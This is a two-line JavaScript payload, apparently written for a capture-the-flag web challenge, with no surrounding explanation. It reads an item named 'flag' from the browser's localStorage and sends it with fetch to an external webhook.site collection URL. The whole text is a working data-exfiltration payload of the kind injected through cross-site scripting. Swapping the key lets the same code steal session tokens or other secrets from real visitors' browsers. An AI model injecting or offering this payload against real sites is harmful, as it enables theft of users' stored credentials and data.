var flag = localStorage.getItem("flag");
fetch("https://webhook.site/2f16d9d2-d7dc-41ed-b791-41ba3e4de387?flag=" + encodeURIComponent(flag));
